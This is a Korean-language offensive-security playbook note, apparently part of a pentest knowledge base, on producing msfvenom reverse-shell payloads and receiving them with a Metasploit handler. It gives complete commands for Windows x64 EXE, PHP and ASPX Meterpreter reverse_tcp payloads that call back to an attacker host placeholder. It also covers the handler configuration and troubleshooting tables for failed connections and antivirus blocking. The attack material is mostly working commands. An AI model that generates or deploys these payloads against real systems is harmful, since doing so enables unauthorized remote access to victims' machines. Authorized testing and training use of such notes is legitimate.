---
tags:
  - 환경/windows
  - 환경/linux
시작조건: ["payload 전달 및 실행 경로 확보"]
필요권한: ["파일 실행 또는 업로드/RCE 권한"]
필요조건: ["listener 접근 경로"]
결과: ["payload", "세션"]
---

# MSFVenom Payload 생성과 Handler 수신

## 한 줄 판단

대상 운영체제·CPU 아키텍처·실행 환경을 알고 대상에서 공격 호스트의 수신 포트까지 연결할 수 있다면, 동일한 payload 설정으로 실행 파일과 handler를 준비해 대상의 현재 실행 계정으로 세션을 받는다.

## 사용할 때

- 웹 업로드, RCE, 파일 실행, MSI/EXE/WAR/ASPX/PHP payload가 필요할 때.
- Metasploit exploit이 아니라 별도 전달 경로로 Meterpreter/shell을 받고 싶을 때.
- staged/stageless 차이를 선택해야 할 때.

## 전제 조건

| 조건 | 확인 방법 | 충족 기준 |
|---|---|---|
| 대상 환경 | OS/arch/server stack | payload format 결정 |
| 전달 경로 | 업로드/RCE/파일 실행 | payload 실행 가능 |
| 역방향 연결 경로 | 대상에서 공격 호스트의 IP와 수신 포트로 실제 TCP 연결 | payload가 사용할 주소와 포트로 연결 가능 |

## 실행

### 방식 선택

| 대상 실행 환경 | 공격 호스트에서 준비할 입력 | 생성 결과 | 실패 시 먼저 확인할 항목 |
|---|---|---|---|
| 64비트 Windows에서 EXE 실행 가능 | Windows x64 payload, `<ATTACKER_IP>`, `<PORT>` | Windows 실행 파일 | 대상 CPU 아키텍처, 파일 실행 권한, 보안 제품 차단 |
| PHP를 처리하는 웹 경로 | PHP payload, `<ATTACKER_IP>`, `<PORT>` | PHP 스크립트 | 업로드 URL, PHP handler, 파일 저장과 서버 측 실행 여부 |
| ASP.NET을 처리하는 IIS 경로 | Windows x64 payload, `<ATTACKER_IP>`, `<PORT>` | ASPX 스크립트 | IIS의 ASP.NET handler, application pool 아키텍처, 업로드 확장자 처리 |

어떤 형식을 선택하든 공격 호스트의 handler에는 생성할 때 사용한 payload 이름, `LHOST`, `LPORT`를 그대로 설정한다. 파일 생성 성공은 세션 확보가 아니며, 대상에서 파일을 실행한 뒤 handler에 연결이 들어와야 한다.

### Windows EXE payload

실행 위치: 공격 호스트. 대상이 64비트 Windows이고 EXE 파일을 전달·실행할 수 있을 때 선택한다.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o shell.exe
```

확인할 출력:

- payload size와 `shell.exe` 생성 경로.
- 파일은 생성됐지만 대상에서 실행되지 않으면 전달 경로, Windows 아키텍처, 실행 권한과 보안 제품 차단을 확인한다.

### PHP payload

실행 위치: 공격 호스트. 대상 웹 경로가 `.php`를 서버 측에서 처리할 때 선택한다.

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw -o shell.php
```

확인할 출력:

- payload size와 `shell.php` 생성 경로.
- HTTP로 파일 내용만 내려오면 PHP handler가 실행되지 않는 경로이므로 세션 성공으로 판단하지 않는다.

### ASPX payload

실행 위치: 공격 호스트. 대상 IIS 경로가 ASP.NET을 처리하고 Windows x64 payload가 맞을 때 선택한다.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f aspx -o shell.aspx
```

확인할 출력:

- payload size와 `shell.aspx` 생성 경로.
- 업로드는 성공했지만 ASPX 요청이 실행되지 않으면 handler 매핑, application pool 아키텍처와 업로드 경로의 실행 허용 여부를 확인한다.

### handler

실행 위치: 공격 호스트. 위에서 생성한 파일을 대상에서 실행하기 전에 시작한다.

```text
msfconsole
use exploit/multi/handler
set payload <PAYLOAD>
set LHOST <ATTACKER_IP>
set LPORT <PORT>
run
```

확인할 출력:

- `Meterpreter session opened`.
- listener만 시작되고 연결이 없으면 payload 생성 성공 여부가 아니라 대상에서 `<ATTACKER_IP>:<PORT>`까지의 TCP 도달성, 실제 파일 실행 여부와 payload 설정 일치를 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| payload 실행 후 handler에 session이 열린다. | handler와 payload 연결 확인 | 대상 payload 프로세스 권한의 세션 | `getuid`, `sysinfo`, `pwd`로 플랫폼과 실행 권한 확인 |
| `getuid`, `sysinfo`, `pwd`가 동작한다. | Meterpreter 세션 컨텍스트 확인 | 세션 | [[Meterpreter 세션 후속 행동]]에서 세션 안정성과 권한을 재평가 |
| 실행 안 됨 | arch/format 불일치 | 시작 상태 유지 | x86/x64, PHP/JSP/ASPX, 권한 |
| 연결 없음 | LHOST/VPN/egress 오류 | 시작 상태 유지 | tun0 IP, 다른 포트, stageless/netcat 대체 |
| AV 차단 | payload signature | 시작 상태 유지 | 수동 shell 또는 다른 실행 경로로 전환 |

## 확인할 출력과 권한

- 판정 기준: payload 파일 생성과 handler 세션 수신을 구분하고 `getuid`·`sysinfo`로 세션 권한과 아키텍처를 확인한다.

## 후속 공격 연결

- [[Meterpreter 세션 후속 행동]]
- [[Reverse Shell 획득]]
- [[상황별 파일 전송]]

## 관련 상태 라우터

- handler가 실제 세션을 수신했으면 대상 OS에 따라 [[Linux 셸 확보 후 초기 열거와 권한 상승]] 또는 [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]

## 관련 도구

- [[msfvenom]]
- [[metasploit]]
- [[meterpreter]]
- [[netcat]]
